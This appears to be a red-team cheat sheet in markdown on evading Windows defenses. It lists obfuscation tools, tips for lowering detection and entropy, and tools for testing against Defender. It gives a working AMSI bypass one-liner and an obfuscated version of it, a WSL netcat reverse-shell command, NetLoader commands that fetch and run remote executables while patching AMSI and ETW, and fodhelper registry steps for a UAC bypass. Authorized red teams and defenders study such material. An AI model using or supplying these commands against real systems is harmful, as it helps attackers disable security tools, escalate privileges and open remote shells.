## General index
- [General](#general)
	- [Obfuscation tools](#obfuscation-tools)
	- [Evasion techniques](#evasion-techniques)
	- [Defeating Microsoft Defender](#defeating-microsoft-defender)
	- [Privileges](#privileges)
	- [UAC bypass](#uac-bypass)

## General
### Obfuscation tools
#### C# binaries
- Obfuscate C# binary with https://github.com/mkaring/ConfuserEx
1. Launch ConfuserEx
2. In Project tab select the Base Directory where the binary file is located.
3. In Project tab Select the Binary File that we want to obfuscate.
4. In Settings tab add the rules.
5. In Settings tab edit the rule and select the preset as `Normal`.
6. In Protect tab click on the protect button.
7. We will find the new obfuscated binary in the Confused folder under the Base Directory.

#### Go binaries
- https://github.com/burrowers/garble

#### Command line arguments
- https://argfuscator.net/
- Blogpost: https://www.wietzebeukema.nl/blog/bypassing-detections-with-command-line-obfuscation

#### Powershell
- [https://github.com/danielbohannon/Invoke-Obfuscation](https://github.com/danielbohannon/Invoke-Obfuscation)
- [https://github.com/JoelGMSec/Invoke-Stealth](https://github.com/JoelGMSec/Invoke-Stealth)
- [Remove comments with PowerStrip](https://github.com/yoda66/PowerStrip)

### Evasion techniques
- Most examples are in PowerShell but techniques can be implemented in every coding language

#### Things that get you caught
- Using Templates; MSbuild template / scripts / etc
- Not changing variable & function names
- Not removing comments
- Not obfuscating common code exec patterns
  - Applies to scripts, templates & Compiled code
- Not changing error messages etc.
- Entropy
   - Rougly - high entropy = more random
   - Higher entropy = less compressible
   - Problem: we encrypt shellcode to evade
   - encrypted shellcode = more random -> higher entropy
   - Dont randomize all the things
      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs.

#### How amsi evaluates PowerShell commands
- The code is evaluated when its readable by the scripting engine
- This is what allows us to still be able to obfuscate our code
```
# This
powershell -enc VwByAGkAdABlAC0ASABvAHMAdAAoACIASABlAGwAbABvACAAVwBvAHIAbABkACIAKQA=

# Becomes
Write-Host("Hello World")

# But This
Write-Host("He" + "llo" + "World")

# Does not become
Write-Host("Hello World")
```

### Change the following in scripts/code
#### Hash of file/code
 - Change Capitalization 
	 - PowerShell ignores capitalization, AMSI ignores capitalization, but changing your hash is best practice.
		 -   `$variablename = "amsicontext"` to `$VaRiAbLeNaMe = "amsicontext"`
	- C# is case sensitive, but changing the capitalization changes the hash. (Must change every entry of the variable!)
- Remove comments
	- Remove all comments out of the script/code
		- https://powershell.one/isesteroids/quickstart/overview
		- https://github.com/yoda66/PowerStrip

#### Byte strings
- Change variable names
   - `$variablename = "amsicontext"` to `$LoremIpsum = "amsicontext"`
   - Don't randomize all the things
      - Changing default variable/func. names is good, but random characters is bad. Use two-word pairs (Example: DragonBerrySmasher)
- Concatenation
   - `"amsicontext"` to `"am" + "si" + "con" + "te" + "xt"`
- Variable insertion
   - `$variablename = 'context'` into `$variablename2 = "Amsi$variablename"`
   - C# `string variablename = "context"; string variablename2 = $"amsi{variablename}";`
   - Format string
      - `$variablename = "amsi{0}text -f "con"`
      - `$client = New-Object System.Net.Sockets.TCPClient("10.10.10.10",80);` to `$client = New-Object ("{0}{1}" -f 'SySteM.Ne', 'T.SoCkEts.TCPCliEnt')("10.10.10.10",80);`
      - C# `string variablename = "context"; string variablename2 = String.Format("amsi{0}",variablename);`
- Potentially the order of execution
- Obfuscating shellcode
   - Shellcode as UUID
      - https://github.com/boku7/Ninja_UUID_Runner/blob/main/bin2uuids.py
   - Reverse shellcode bytes
   - Break into chunks
   - Divide code into two arrays - even & odd bytes
   - Steganography
   - `BigInteger() h/t`
   - Shellcode as english words
      - https://github.com/hardwaterhacker/jargon
   - Shellcode as Emoji
      - https://github.com/RischardV/emoji-shellcoding
- Lower entropy
   - Languages are not random
   - Create an array with a dictionary and compile it with the code (disable compiler optimization)
- Misc
   - PowerShell
      - Properties of an object
         - Can be obfuscated with backticks `$notify.icon` to ```$notify."i`c`on"```
   - C#
     - Changing the variable type (i.e list vs array) 
     - Rename your entrypoints
        -  https://learn.microsoft.com/th-th/dotnet/framework/interop/specifying-an-entry-point#renaming-a-function-in-c-and-c\
```
[DllImport("kernel32")]
	private static extern IntPtr VirtualAlloc(
	UInt32 lpStartAddr, 
	UInt32 size, 
	UInt32 flAllocationType, 
	UInt32 flProtect);

[DllImport("kernel32, EntryPoint = VirtualAlloc",
	SetLastError = false, ExactSpelling = true)]
	private static extern IntPtr SplendidDragon(
	UInt32 lpStartAddr, 
	UInt32 size, 
	UInt32 flAllocationType, 
	UInt32 flProtect);
```

#### Structure of the code
- Change methods and lines of code around. 

#### Example of changing amsi bypass string
```
# Original amsi bypass
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

# New
$v=[Ref].Assembly.GetType('System.Management.Automation.Am' + 'siUtils'); $v."Get`Fie`ld"('ams' + 'iInitFailed','NonPublic,Static')."Set`Val`ue"($null,$true)
```

### Defeating Microsoft Defender
- Use https://github.com/rasta-mouse/ThreatCheck
- Or https://github.com/matterpreter/DefenderCheck
- Or https://github.com/gatariee/gocheck (Supports multiple av's)
1. Run Threatcheck ```.\ThreatCheck.exe -f .\shell.exe```
2. Replace string which gets detected.
3. Recompile and check again!
- Also possible to use https://github.com/dobin/avred

### Scanning amsi
#### Threatcheck
- https://github.com/rasta-mouse/ThreatCheck
```
.\ThreatCheck.exe -f .\shell.ps1 -e AMSI
```

#### AmsiTrigger
- https://github.com/RythmStick/AMSITrigger
```
.\AmsiTrigger.exe -i .\shell.ps1 -f 2
```

### Offensive .NET
- https://github.com/Flangvik/NetLoader
- Load binary from filepath or URL and patch AMSI & ETW while executing
```
C:\Users\Public\Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Use custom exe Assembyload to run netloader in memory and then load binary
```
C:\Users\Public\AssemblyLoad.exe http://xx.xx.xx.xx/Loader.exe -path http://xx.xx.xx.xx/something.exe
```

#### Random notes
```
pyinstaller.exe --onefile .\CVE-2021-1675.py
pyarmor pack --clean -e "--onefile " .\CVE-2021-1675.py
```

### Windows Subsystem for Linux WSL
- AVs which do not use Pico process APIs have no visibility of the processes executed using WSL. This provides better chances of bypass.
- With the additional Linux tooling included (like Python), WSL increases the attack surface of a machine and the opportunities to abuse the new functionality.

#### Netcat shell
```
wsl.exe mknod /tmp/backpipe p && /bin/sh 0</tmp/backpipe | nc <IP> <PORT> 1>/tmp/backpipe
```

#### Bypass whitelisting
- In both the above cases, the Windows application will have:
  – Same permissions as the WSL process. 
  – Run as the current Windows user.
  – Uses the working directory as the WSL command prompt. That is we can access the Windows file system from WSL.
```
bash.exe -c cmd.exe
wsl.exe cmd.exe
```

### Privileges

#### Check current privileges
```
whoami /priv
```

### SeDebugPrivileges
- http://woshub.com/obtain-sedebugprivilege-debug-program-policy-enabled/

#### Export the current user rights set by the group policies to a text file:
```
secedit /export /cfg secpolicy.inf /areas USER_RIGHTS
```

#### Edit the secpolicy.ing
- Change the SeDebugPrivileges to ```S-1-5-32-544``` the Local administrator group.
```
notepad.exe secpolicy.inf
```
- Or converts sids: http://woshub.com/convert-sid-to-username-and-vice-versa/

#### Save the new user rights set
```
secedit /configure /db secedit.sdb /cfg secpolicy.inf /overwrite /areas USER_RIGHTS
```

#### Start cmd again
- Check privileges with ```whoami``` if not having SeDebugPrivilege do ```PsExec.exe -i cmd.exe```

### UAC bypass
- A UAC bypass is a technique by which an application can go from Medium to High Integrity without prompting for consent.
- Tool: https://github.com/hfiref0x/UACME
- Guide on how to build: https://ad-lab.gitbook.io/building-a-windows-ad-lab/vulnerabilities-and-misconfigurations-and-attacks/misc/page-3-4

 ```
 .\Akagi64.exe <METHOD> <EXECUTABLE>
 .\Akagi64.exe 34 cmd.exe
 ```
 
#### Automatec UAC bypass PowerShell script 
- https://github.com/x0xr00t/Automated-MUlti-UAC-Bypass

```
.\Win-Multi-UAC-Bypass.ps1
```
 
### Manual UAC bypass
- https://atomicredteam.io/defense-evasion/T1548.002/
 
#### Fodhelper
- Can also use ```C:\Windows\System32\cmd.exe /c powershell.exe```
```
New-Item "HKCU:\software\classes\ms-settings\shell\open\command" -Force
New-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "DelegateExecute" -Value "" -Force
Set-ItemProperty "HKCU:\software\classes\ms-settings\shell\open\command" -Name "(default)" -Value "<PATH TO EXE>" -Force
Start-Process "C:\Windows\System32\fodhelper.exe"
 
# Cleanup
Remove-Item "HKCU:\Software\Classes\ms-settings\" -Recurse -Force
```
 
#### Check current UAC configuration
- The default configuration for UAC is Prompt for consent for non-Windows binaries, but can also have different settings such as Prompt for credentials, Prompt for consent and Elevate without prompting.
```
Seatbelt.exe uac
```

